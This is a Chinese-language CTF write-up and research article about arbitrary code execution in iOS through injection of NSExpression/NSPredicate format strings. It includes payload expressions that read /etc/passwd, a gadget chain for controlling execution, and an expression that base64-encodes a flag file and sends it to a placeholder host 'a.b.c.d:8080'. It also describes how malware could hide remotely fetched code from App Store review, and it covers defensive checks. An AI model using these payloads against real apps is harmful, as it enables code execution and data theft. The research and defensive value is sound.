**作者： 0xcc  
原文链接：<https://mp.weixin.qq.com/s/6dwi96sQ222KVsgbt4FW5A> **

2019 年的 RealWorldCTF 有一道叫“德州计算器”的题目。选手需要输入特定的 URL scheme 唤起题目的计算器
app，想方设法触发远程代码执行，获取 App 安装目录下的一个文件。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876463000-1zaumw.png-w331s)

iOS 因为其封闭性，选手调试、主办方运维都很困难，所以此前很少出现在 ctf 竞赛中。DEFCON CTF 27 决赛有一个
TelOoOgram，是运行在 iOS 虚拟机 Corellium 上的，应该是史上第一次在 attack & defense 环节出现
iOS。而这一次我们直接在一台 Xr 物理机上运维，搭载了当时最新的 iOS 12.4.1 系统，来真的！

![图片](https://images.seebug.org/content/images/2021/04/08/1617876464000-2jevxo.png-w331s)

当时外国微博网友的评论：

> That must be an expensive challenge ??

“好贵的题目”

> I think they're just trying to get their participants to find new Jailbreaks
> so they can sell them to Apple

“我感觉主办方在空手套 0day，好卖给苹果”

哈哈哈……是这样吗？

先来看看题目。

计算器程序是 swift 编写的。比赛给了 x64 模拟器版和 arm64（这是一个小错误，后面文章会解释）的真机版二进制文件。可执行文件没有去除符号，除了
swift 语言生成的 mangled 符号很冗长，阅读起来没有太大问题。

核心代码只有寥寥数行。程序注册了一个 icalc:// 的 URL，启动后读入 URL 的 host 字段，解码后作为数学表达式执行，并打印结果：

    
    
    public func evaluate(input: String) -> String {
      let mathExpression = NSExpression(format: input)
      if let value = mathExpression.expressionValue(with:constants, context: nil) {
        return "= " + String(describing: value)
      } else {
        return "(invalid expression)"
      }
    }

看来玄机就在 NSExpression 里。

虽然手机是搭载了当时最新的 A12 芯片真机，这个题目并不需要真的绕过 PAC，也不用担心 iOS 的代码签名策略，同样可以执行任意代码。

因为 Objective-C 里有一个鲜为人知的类似 eval 的功能。

一提到 eval
函数，一些有经验的程序员，特别是有安全背景的，一般都会皱起眉头。这个函数多出现在脚本语言解释器当中，允许将输入的字符串变量当作代码动态执行。

由于 eval 直接执行代码的能力，对输入处理不当的情况下会造成严重的远程代码执行问题；加之 eval
本身接受动态字符串的设计，使得编译期的优化成本被放在运行时，对程序效率有很大影响；最后 eval
执行的代码上下文有可能调用栈不完整，对调试也不够友好。很多人眼中 eval == evil，都尽量避免使用。

笔者是眼花了？Objective-C 作为一门编译型语言，生成的二进制都是本地代码，怎么能提供 eval
的能力？除非借助脚本引擎并暴露原生接口，例如一些基于 JavaScriptCore 的 hybrid app
或者热补丁框架。这些显然都属于第三方代码，不是语言或者 Runtime 自带的功能。

然而 Objective-C 的 Foundation 框架里还真的自带了一个具有原生代码执行能力的解释器。它们甚至在官方文档上有清晰的说明，就是
NSPredicate 和 NSExpression 两个类。它们接受特定语法的表达式，内置了数学运算甚至局部变量的支持，还能调用任意
Objective-C 方法，相当于在语言当中嵌入了另一个脚本语言。

NSPredicate（谓词）对许多 iOS 开发者来说不会陌生。最常见的场景就是用来过滤数组和正则表达式匹配，也可以配合 CoreData 查询数据库。

通常使用 +[NSPredicate predicateWithFormat:] 创建一个实例。此外还有两个方法可以实现参数绑定：

  * \+ predicateWithFormat:argumentArray:
  * \+ predicateWithFormat:arguments:

例如如下代码将在数组 names2 当中找到所有在 names1 当中出现过的元素：

    
    
    NSArray *names1 = [NSArray arrayWithObjects:@"Herbie", @"Badger", @"Judge", @"Elvis",nil];
    NSArray *names2 = [NSArray arrayWithObjects:@"Judge", @"Paper Car", @"Badger", @"Finto",nil];
    
    NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF IN %@", names1];
    NSArray *results = [names2 filteredArrayUsingPredicate:predicate];
    NSLog(@"%@", results);

关于 predicate 的语法，可以访问 Apple 的官方开发者文档：

<https://developer.apple.com/documentation/foundation/nspredicate?language=objc>

NSExpression 稍微小众一些，但和 NSPredicate 关系密切。每一个 NSPredicate 对象都由至少两个 NSExpression
操作数（左值、右值）组成。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876464000-3tpioa.png-w331s)

用来初始化谓词的语法和 NSExpression 的语法是同一套。如果阅读 Foundation.framework
的反汇编，就会发现，哪怕是官方的代码，在初始化 NSExpression 的时候都是先创建一个 NSPredicate，然后取其中一个操作数节点返回。

它们都支持复合运算的数学表达式，因此可以直接用来当计算器使用：

    
    
    let mathExpression = 
    let mathExpression = NSExpression(format: "4 + 5 - 2**3")
    let mathValue = mathExpression.expressionValueWithObject(
                                           nil, context: nil) as? Int
    // 1NSExpression(format: "4 + 5 - 2**3")let mathValue = mathExpression.expressionValueWithObject(                                       nil, context: nil) as? Int// 1

而在这个例子里，表达式会转化成 NSFunctionExpression 对象，其具有如下属性：

  * operand：NSPredicateUtilities 类
  * selector: +[_NSPredicateUtilities from:substract:] 方法
  * arguments：参数数组，包含嵌套的 NSExpression 表达式对象

![图片](https://images.seebug.org/content/images/2021/04/08/1617876464000-4jkaag.png-w331s)

也就是说，数学运算在这里翻译成了一个 AST（抽象语法树）结构，叶子节点是各种 NSExpression 的子类，用来表示操作数。二元数学运算映射到了
_NSPredicateUtilities 类的特定方法的调用。具体到某个数字字面量，则会翻译成
NSConstantValueExpression，内部使用 NSNumber 表示具体的值。

在调用 -[NSExpression expressionValueWithObject:context:] 时，Foundation
将这个语法树转换成一系列的 NSInvocation 对象并执行。上面的数学表达式 4 + 5 - 2**3，等价于如下的 Objective-C 代码：

    
    
    [_NSPredicateUtilities from:
     [_NSPredicateUtilities add:@4 to:@5]
     subtract:[_NSPredicateUtilities raise:@2 toPower:@3]];

而 _NSPredicateUtilities 这个类，则包含了所有支持的运算符和表达式的实现：

![图片](https://images.seebug.org/content/images/2021/04/08/1617876465000-5stsvs.png-w331s)

需要注意的是，NSExpression 返回的值并不能保证类型，在特殊情况下甚至无法保证返回的是 NSObject 的子类实例（id）。

那么什么样才叫特殊情况？

这是摘自 NSExpression 文档的一段话：

![图片](https://images.seebug.org/content/images/2021/04/08/1617876465000-6wnnvk.png-w331s)

<https://developer.apple.com/documentation/foundation/nsexpression>

读者在前文已经注意到了，即使是类似 1+1 这样的数学表达式也会翻译成 NSFunctionExpression，而这个对象里直接保存了
objc_msgSend 的 target、selector 和 arguments 参数。实际上调用任意原生 Objective-C
方法是允许的，诀窍就是使用这个叫 FUNCTION() 的函数，基本等价于 objc_msgSend 或者 performSelector:。

例如：

> FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'),
> 'initWithContentsOfFile:', '/etc/passwd')

这行表达式先用 superclass 获取 NSString 类，然后创建一个新实例并用 - initWithContentsOfFile:
方法填充内容，执行的结果会读取到 /etc/passwd 文件。

更为强大的是，Foundation 内部直接提供了一个 CAST() 操作符用来做数据类型的转换。在其中有一个“后门”，当第二个参数是 Class
时，就会调用 NSClassFromString 通过反射查找对应的类返回。

    
    
    id +[_NSPredicateUtilities castObject:toType:]
    (_NSPredicateUtilities_meta *self, SEL a2, id a3, id NSString)
    {
    if ([@"Class" isEqualToString:a4])
     return NSClassFromString(a4);

是不是有 Java 反序列化漏洞的味儿了？

能 NSClassFromString 和 performSelector:，任意代码执行绰绰有余了。

Project Zero 之前做了一个 iMessage 远程 0click 任意代码执行的研究，其中创造了一种在 PAC 环境下仍然可以执行（几乎）任意
Objective-C 和导出符号的办法，称之为 SeLector Oriented Programming。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876466000-7eerrp.png-w331s)

<https://bugs.chromium.org/p/project-zero/issues/detail?id=1933>

可以看到 NSExpression 和 SLOP 的效果非常接近。不过这样执行任意代码是有局限性的：

  * NSExpression 没有代码“行”的概念，一次就只有一个表达式
  * 没有控制流。不过表达式支持一些逻辑运算，可以变相实现一些判断
  * 默认情况下没有局部变量。只有在 -[NSExpression expressionValueWithObject:context:] 方法的 context 传入一个 NSMutableDictionary 时，才可以使用 variable assignment 语句。但由于一次只能一行表达式，实际上也不能达到局部变量的效果
  * 还好 One-liner 仍然可以做很多事情

我们写了一个 python 工具类帮助生成谓词语法：

![图片](https://images.seebug.org/content/images/2021/04/08/1617876466000-8ezlwb.png-w331s)

回到题目本身。由于笔者疏忽，在当时的 rwctf 上提供的二进制文件仍然是 arm64（而不是 arm64e）。这就导致原本想要的 PAC
噱头，实际上没有启用。

笔者还犯了一个错误。运维环境基于 lldb 的 USB 调试，由于 lldb 协议的局限性，自动化启动 app 时并不支持传入 URL
scheme，所以实际上是用 argv。App 还有一个 bug，没有在 delegate 里同步状态，导致实际上只有 argv 是有效的，而 URL
scheme 不能正确传入参数。这让一些在模拟器上测试的选手非常困惑

没有 PA，也就是说 ROP 仍然可用。那么在这个题目的设定之下，允许传入 NSExpression，能否控 pc？

在 SLOP 里用了一个私有函数（gadget）-[NSInvocation invokeUsingIMP:]，imp 参数即是函数指针，在不违反 PAC
限制（例如 arm64 架构，或者函数指针被 zero context 签名过）的前提下是可以修改程序控制流的。

但这个方法有一个特点，就是要求 NSInvocation 实例的 target 对象（对应 objc_msgSend 第一个参数）不得为空，否则不执行。

因此我们需要实现如下的调用链：

  * +[NSInvocation alloc]
  * -[NSInvocation setTarget:]
  * -[NSInvocation invokeUsingIMP:]

在这里同一个变量被使用了两次，意味着没办法转换成 one-liner 的形式。

还好在标准库里直接有一个 gadget 可以帮忙：

    
    
    [[NSInvocationOperation alloc] initWithTarget:target 
                                         selector:sel object:nil]

一行代码里就可以初始化一个 NSInvocationOperation 对象的 target、selector 和 object，接着用 FUNCTION
表达式访问其 invocation 属性即可返回对应的 NSInvocation。

一个要求就是，在这里的 selector: 参数不能是一个简单的字符串。因此我们用到了另一个 gadget 用来调用
NSSelectorFromString：

    
    
    [[[NSFunctionExpression alloc] initWithTarget:@""
                                     selectorName:@"alloc"
                                        arguments:@[]] selector]

具体的 selector 和 object 都不重要，我们只需要让 target 不为空，以及能控制 imp 的值。

最终的 PoC 代码如下

![图片](https://images.seebug.org/content/images/2021/04/08/1617876466000-9yrhoc.png-w331s)

转化为表达式：

![图片](https://images.seebug.org/content/images/2021/04/08/1617876467000-10idote.png-w331s)

至于地址随机化的问题，可以参考 SLOP 的做法，用 -[CNFileServices dlsym::] 或者 -[ABFileServices
dlsym::]（实际上就是 dlsym 的包装）直接解析出符号。

到这一步题目的做法就很清晰了。首先获取 flag 文件的路径，然后读取到一个 NSData 当中。回传数据非常简单，只需要用 Foundation 里的
[NSData dataWithContentsOfURL:] 或者 [NSString
stringWithContentsOfURL:]，就会隐式地发起一个 HTTP GET 请求来获取对应 URL 内容，从而把参数回传出去：

    
    
    NSString* path = [[NSBundle main] pathForResource:"flag" ofType:""];
    NSString* flag = [[NSData dataWithContentsOfFile:path] base64Encoding];
    NSString* urlString = [@"http://a.b.c.d:8080/" stringByAppendingString:flag];
    NSURL* url = [NSURL URLWithString:urlString];
    [NSData dataWithContentsOfURL:url];

翻译为表达式格式：

FUNCTION(CAST("NSData","Class"),'dataWithContentsOfURL:',FUNCTION(CAST("NSURL","Class"),
'URLWithString:',FUNCTION("http://a.b.c.d:
8080/",'stringByAppendingString:',FUNCTION(FUNCTION(CAST("NSData","Class"),'dataWithContentsOfFile:',FUNCTION(FUNCTION(CAST("NSBundle","Class"),'mainBundle'),'pathForResource:ofType:',"flag",
"")),'base64Encoding'))))

然后 URL 编码成为 icalc:// 接受的格式即可。

所谓 RealWorld CTF，就要提到这个研究在真实世界里的应用。

iOS 上的代码签名政策非常严格，默认情况下应用都通过 AppStore
分发，并且有审核机制。苹果严令禁止应用从远端服务器动态拉取代码执行，因为这可能绕过审核机制，实现违反应用规范的功能，甚至分发恶意代码。

在开发者社区颇受欢迎的热补丁机制则是利用一些脚本语言解释器，例如系统自带的 JavaScriptCore，也有使用 lua 的，将一些 native
的功能动态导出给脚本。在解释执行脚本的时候并不需要创建新的代码页，也就自然没有代码签名的限制。

苹果曾经发送邮件警告过使用诸如 dlsym、performSelector：等动态代码执行的行为，可能会违反应用审核规范导致被下架，波及包括
ReactNative 框架用户在内的大批开发者。

而 NSPredicate 和 NSExpression
可以做到非常隐蔽。对于恶意软件，完全可以假装在过滤数组，实际上从远端拉取了动态代码执行。这种方式完全不会出现任何动态函数调用的符号（NSClassFromString、NSSelectorFromString），也没有用到任何已知的热补丁框架。哪怕是人工做源代码级别的审查，也难以发现。

如下是一个简单的 poc，通过提供一个持久化的 NSMutableDictionary 保存上下文，并循环执行多个表达式，实现多行脚本解释执行的效果。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876467000-11dmvhu.png-w331s)

应用动态拉取代码的攻击此前比较著名的有两次。

iOS Hacker's Handbook 的作者之一 Charlie Miller 在 AppStore
里发布了一款“股票”应用，实际上会从远程服务器拉取动态链接库并使用 dlopen
载入，从而实现绕过商店审核执行恶意代码。在此之后苹果吊销了他的开发者证书，并加入了更严格的代码签名限制阻止这种攻击。

另一篇 USENIX 论文 Jekyll on iOS: When Benign Apps Become Evil 则采用了 Return-Oriented
Programming 的办法，在程序当中隐藏漏洞，劫持控制流之后复用系统库自带的代码来实现诸如越狱等复杂的恶意代码操作。在 A12 芯片引入 PAC
之后，这种攻击实现起来更难了。

而本文提到的动态代码执行的接口在最新硬件上仍然可用。

作为攻击面考虑，在用户可控的格式串前提下可能会造成代码执行问题，就像 ctf 题目里的那样。这个攻击面看上去和 SQL 注入非常类似。

  * +[NSPredicate predicateWithFormat:]
  * +[NSPredicate predicateWithFormat:argumentArray:]
  * +[NSPredicate predicateWithFormat:arguments:]
  * +[NSExpression expressionWithFormat:]
  * +[NSExpression expressionWithFormat:argumentArray:]
  * +[NSExpression expressionWithFormat:arguments:] 

只有当 format 参数是用户可控的字符串时才会造成风险。无论是 arguments 还是 argumentArray，在 Foundation
内部都会做类似 SQL 参数绑定的处理，不存在安全风险。

值得一提的是，format 参数可控这件事本身又是另一种经典的漏洞，格式串漏洞，和 printf 当中的利用基本类似。只是通过 runtime
特性的方式更为直接。

这种注入有没有可能出现在系统上？

苹果还真的意识到了这件事。

Foundation 有一个文档里没提到的 NSPredicateVisitor 协议。开发者可以通过实现这个协议里的委托方法来遍历表达式 AST，通过校验
expression 和 operator 的类型来过滤非法的表达式：

    
    
    @protocol NSPredicateVisitor
    
    @required
    -(void)visitPredicate:(id)arg1;
    -(void)visitPredicateExpression:(id)arg1;
    -(void)visitPredicateOperator:(id)arg1;
    @end

在获取相册的 API 里有一个 PHFetchOptions 类，提供一个 predicate
参数。这个类会跨进程调用，存在注入的风险。当我们阅读反汇编可以看到，在方法 -[PHQuery visitPredicateExpression:]
里实现了参数检查：

![图片](https://images.seebug.org/content/images/2021/04/08/1617876467000-12jrwvt.png-w331s)

笔者在某个 USB 可以访问的开发者特性、IPC 传递的 PluginKit 参数、以及一个可能造成越狱持久化的文件、以及 macOS 上可能造成 root
提权和 SIP 绕过的 log 命令里，都看到了任意可控的 predicate 的影子。但不幸的是，它们全部都做了校验。

此外，NSPredicate 和 NSExpression 都支持序列化。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876468000-13nngew.png-w331s)

在启用了 SecureCoding 的情况下，predicateFlags 会添加一个标记，将影响到 _allowsEvaluation 的返回值。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876468000-14mjovd.png-w331s)

除非显式调用一次 allowEvaluation 方法，否则表达式会拒绝执行。

![图片](https://images.seebug.org/content/images/2021/04/08/1617876470000-15jivge.png-w331s)

这在一定程度上控制了反序列化的攻击面。但是请注意，被废弃的 + unarchiveObjectWithData: 方法是不受保护的。

本文从一个 CTF 题目展开，从官方文档结合反汇编分析，挖掘出语言和运行时鲜为人知却可能被滥用的机制。谁曾想到编译型的语言竟然也内置支持 eval？

参考文章:

  1. <https://developer.apple.com/documentation/foundation/nspredicate?language=objc>
  2. <https://developer.apple.com/documentation/foundation/nsexpression?language=objc>
  3. <https://nshipster.com/nsexpression/>
  4. Predicate Format String Syntax <https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Predicates/Articles/pSyntax.html>
  5. Issue 1933: SLOP - A Userspace PAC Workaround <https://bugs.chromium.org/p/project-zero/issues/detail?id=1933>
  6. Wang T, Lu K, Lu L, et al. Jekyll on ios: When benign apps become evil[C]//22nd {USENIX} Security Symposium ({USENIX} Security 13). 2013: 559-572.

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1554/>

